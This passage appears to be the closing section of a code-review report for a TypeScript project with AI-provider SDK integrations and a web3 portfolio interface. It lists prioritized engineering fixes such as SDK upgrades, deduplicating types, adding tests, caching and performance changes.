3. **Bump Anthropic + OpenAI SDKs** — the `ContentBlockParam` comment
   in `anthropic.ts:9` is a confession that the code is working around
   the wrong version. Bump and let TypeScript tell you what else drifts.

The next 7 things, in order:

4. Consolidate the duplicated `AGENT_ROLES`, `MemoryEntry`, and
   `approvalMode` migration (H-2).
5. Decide what to do with `app-state.ts` mutable global (H-4).
6. Wire `signal` into provider SDK calls (M-7) — real cost bug.
7. Add `tools/executor.test.ts` and `providers/openai.test.ts` (H-9).
8. Cache `scanAllSkills` (H-10).
9. Use multicall3 for approvals (H-11) — biggest user-visible perf win.
10. Split `useWeb3Data.ts` (M-2) and `PortfolioView.tsx` (M-3).

---

*Generated 2026-07-11. Reviewed 200+ files. Total project LOC: 33,480.*
